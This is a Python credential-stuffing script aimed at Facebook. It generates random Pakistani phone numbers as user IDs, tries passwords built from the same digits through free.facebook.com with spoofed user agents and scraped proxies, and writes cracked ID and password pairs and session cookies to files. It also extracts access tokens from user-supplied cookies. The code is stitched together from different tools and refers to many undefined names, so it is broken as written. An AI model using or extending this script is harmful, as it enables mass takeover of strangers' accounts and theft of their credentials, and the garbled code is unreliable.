import random
import sys
import time
def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
#kecepatan mengetik
        time.sleep(random.random() * 0.1)
#ubah angka 0.1 sesuai keinginan kamu
#angka terkecil adalah yang paling cepat
#angka terbesar adalah yang paling lambat

def mtkk(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
#kecepatan mengetik
        time.sleep(random.random() * 0.01)

#----- [ LOGIN LESENSI ] -----
def lesensi():
	mtkk("""
      __   _____________  __________
  / /  / __/ __/ __/ |/ / __/  _/
 / /__/ _/_\ \/ _//    /\ \_/ /
/____/___/___/___/_/|_/___/___/

login your lesensi / api key

""")

	api = input('Enter License : ')

	if api =="":
		mengetik('hoy enter correctly')
		exit()

	time.sleep(3)
	mengetik('\nchecking the license\n')
	time.sleep(3)
	if api not in ('AKSQ-ZHNI-QRXT-OKAQ-PQNS','PNQK-TAHW-BAMA-ZXCW-AKMQ',"BANS-UQJW-YXAU-OAJW-PAJW"):
		mengetik('your lesensi not fund pm TOBIPHcheat ')
		exit()
	else:
		mengetik('lesensi valid ✓ ')

#-----------------[ IMPORT-MODULE ]-------------------

from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
## RANDOM UA
#user_agent=['Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118;]','Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]','Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36']
uas_bawaan = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
uas_nokiac2 = "NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"
uas_nokiax20 = "Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36"
uas_nokiax = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"
uas_samsungse = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"
uas_redmi9a = "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36"
uas_nokiaxl = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"
#uas_chromelinux = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
#uas_j7prime = "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"
uas_tes = "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)"
uas_random = random.choice(["Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])
uas_nokiac3 = "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
uas_iphone = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"
uas_nokia5plus = "Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
uatest2 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
#------------------[ USER-AGENT ]-------------------#
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/TobiPHcheat/F-7/blob/main/approved.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

###----------[ GET TIME ]---------- ###
def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "good morning"
	elif 12 <= hours < 15:timenow = "good afternoon"
	elif 15 <= hours < 18:timenow = "good evening"
	else:timenow = "good night"
	return timenow
#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.001)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	clear()
	alvino_xy("""
████████╗ ██████╗ ██████╗ ██╗              ██████╗ ██╗  ██╗
╚══██╔══╝██╔═══██╗██╔══██╗██║              ██╔══██╗██║  ██║
   ██║   ██║   ██║██████╔╝██║    █████╗    ██████╔╝███████║
   ██║   ██║   ██║██╔══██╗██║    ╚════╝    ██╔═══╝ ██╔══██║
   ██║   ╚██████╔╝██████╔╝██║              ██║     ██║  ██║
   ╚═╝    ╚═════╝ ╚═════╝ ╚═╝              ╚═╝     ╚═╝  ╚═╝
                                                           
""")
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		print ('\tLOGIN WITH COOKIES ')
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'  [{h}•{x}] Cookies :{asu} ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cok.txt", "w").write(cookie)
		print(f'  {x}[{h}•{x}]{h} LOGIN SUCCESSFUL...RUN THE LAST TOBI CMD!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN FAILED....  TRY AGAIN!!%s'%(x,k,x,m,x))
		exit()
#------------------[ BAGIAN-MENU ]----------------#

#---------------------[MAIN MENU]---------------------#
def xyz():
    os.system("play-audio WELCOME_TO_𝙰𝙺𝙰𝚂𝙷_RANDOM_CLONE_TOOL.mp3")
    os.getuid
    
    os.system("clear");print(logo)
    print('           \x1b[97m[\033[37;41m  M A I N   M E N U   \033[0;m] ')
    print(f"")
    print(f'{BLUE}══════════════════════════════════════════════════════')
    print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
    print(f"{BLUE}══════════════════════════════════════════════════════")
    print(f"{RED}[01] {WHITE}RANDOM CLONE PAK  M1")
    print(f"{RED}[02] {WHITE}RANDOM CLONE BD  M1")
    print(f"{RED}[03] {WHITE}OWNER FB ID")
    print(f"{RED}[04] {WHITE}OWNER WHATSAPP")
    print(f"{RED}[00] {WHITE}EXIT PROGRAM ")
    print(f"")
    print(f"\033[1;91m========================================================")
    𝙰𝙺𝙰𝚂𝙷 = input("[√] CHOOSE : ")
    if 𝙰𝙺𝙰𝚂𝙷 in ["1","01"]:
        
        password()
    elif 𝙰𝙺𝙰𝚂𝙷 in ["2","02"]:
        Tabii2()
        
    elif 𝙰𝙺𝙰𝚂𝙷 in ["3","03"]:
        os.system("xdg-open https://www.facebook.com/owner.termux");xyz()
    elif 𝙰𝙺𝙰𝚂𝙷 in ["4","04"]:
        os.system("xdg-open https://wa.me/+8801721474011");xyz()
    elif 𝙰𝙺𝙰𝚂𝙷 in ["0","00"]:
       exit()
    else:
        print('\033[1;31mINCORECT OPTION!\033[1;31m')
        xyz()
#---------------------[PASS DEF]---------------------#
def password():
    
    os.system("clear")
    print(logo)
    print('       \x1b[97m[\033[37;41m  P A S S W O R D   M E N U   \033[0;m] ')
    print(f"")
    print(f"{RED}[01] {WHITE} 1 PASSWORD   {GREEN} [ FASTEST⚡]")
    print(f"{RED}[02] {WHITE} 2 PASSWORDS  {GREEN} [ FAST     ]")
    print(f"{RED}[03] {WHITE} 5 PASSWORDS  {GREEN} [ SLOW   🐌]")
    linex()
    print("")
    passX = input(f" {RED}CHOOSE{𝙰𝙺𝙰𝚂𝙷2} : ")
    if passX in ['1','01']:
        os.system("xdg-open https://www.facebook.com/owner.termux")
        password1()
    elif passX in ['2','02']:
        os.system("xdg-open https://www.facebook.com/owner.termux")
        password2()
    elif passX in ['3','03']:
        os.system("xdg-open https://www.facebook.com/owner.termux")
        password5()
    else:
        xyz()
#---------------------[CLONING MAIN DEF]---------------------#
#---------------------[PASS 1 CLONING MENU]---------------------#
def password1():
    
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
    print(f"")
    print(f" 0306 ,0300 ,0315 ,0333")
    print(f" 0341 ,0342 ,0345 ,0349")
    print(f" 0321 ,0316 ,0308 ,0309")
    print(f"")
    linex()
    print(f"\x1b[97m[\033[37;41mBEST CODE 0300 / 0302 / 0306 / 0349 /0315   \033[0;m]")
    print("")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {BLUE}"+tl+" ~> [ FASTEST⚡]")
        print(f" {WHITE}COUNTRY YOU CHOOSE    : {GREEN}PAKISTAN 🇵🇰")
        print(f" {WHITE}NUMBER YOU PUT        : {YELLOW}"+code)
        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
        print(f'{RED}==========================================================')
        for love in user:
            uid = code+love
            pwx = [love]
            manshera.submit(free1,uid,pwx,tl)
def free1(uid,pwx,tl):
    global loop
    global ok
    global agents
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            pro = random.choice(ugen)
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header = ({"authority": 'free.facebook.com',
            "method": 'GET',
           "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9',
            "cache-control": 'no-cache',
            "pragma": 'no-cache',
            "referer": 'https://free.facebook.com/',
            "sec-ch-ua": '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
            "sec-ch-ua-mobile": '?0',
            "sec-ch-ua-platform":'"Windows"',
            "sec-fetch-dest": 'manifest',
            "sec-fetch-mode": 'cors',
            "sec-fetch-site": 'same-origin',
            "user-agent":pro,})
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[7:22]
                os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_OK.mp3")
                print('\r\033[1;32m[𝙰𝙺𝙰𝚂𝙷-OK] '+uid+' [√] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/𝙰𝙺𝙰𝚂𝙷-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_2F.mp3")
                    print('\r\033[1;34m[𝙰𝙺𝙰𝚂𝙷-2F] '+uid+' [~] '+ps+' ')
                    open('/sdcard/𝙰𝙺𝙰𝚂𝙷-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_CP.mp3")
                    print(f'\r\033[1;30m[𝙰𝙺𝙰𝚂𝙷-CP] '+uid+' [×] '+ps+ ' ')
                    open('/sdcard/𝙰𝙺𝙰𝚂𝙷-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[𝙰𝙺𝙰𝚂𝙷 🔥] [%s] \33[1;97m[OK:%s{𝙰𝙺𝙰𝚂𝙷2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass






#---------------------[PASS 2 CLONING MENU]---------------------#
def password2():
    user=[]
    
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
    print(f"")
    print(f" 0306 ,0300 ,0315 ,0333")
    print(f" 0341 ,0342 ,0345 ,0349")
    print(f" 0321 ,0316 ,0308 ,0309")
    print(f"")
    linex()
    print(f"\x1b[97m[\033[37;41mBEST CODE 0300 / 0302 / 0306 / 0349 /0315   \033[0;m]")
    print("")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {BLUE}"+tl+" ~> [ FAST ]")
        print(f" {WHITE}COUNTRY YOU CHOOSE    : {GREEN}PAKISTAN 🇵🇰")
        print(f" {WHITE}NUMBER YOU PUT        : {YELLOW}"+code)
        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
        print(f'{RED}==========================================================')
        for love in user:
            uid = code+love
            pwx = [love,code+love]
            manshera.submit(free2,uid,pwx,tl)
def free2(uid,pwx,tl):
    global loop
    global ok
    global agents
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            pro = random.choice(ugen)
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header = ({"authority": 'free.facebook.com',
            "method": 'GET',
           "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9',
            "cache-control": 'no-cache',
            "pragma": 'no-cache',
            "referer": 'https://free.facebook.com/',
            "sec-ch-ua": '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
            "sec-ch-ua-mobile": '?0',
            "sec-ch-ua-platform":'"Windows"',
            "sec-fetch-dest": 'manifest',
            "sec-fetch-mode": 'cors',
            "sec-fetch-site": 'same-origin',
            "user-agent":pro,})
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[7:22]
                os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_OK.mp3")
                print('\r\033[1;32m[𝙰𝙺𝙰𝚂𝙷-OK] '+uid+' [√] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/𝙰𝙺𝙰𝚂𝙷-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_2F.mp3")
                    print('\r\033[1;34m[𝙰𝙺𝙰𝚂𝙷-2F] '+uid+' [~] '+ps+' ')
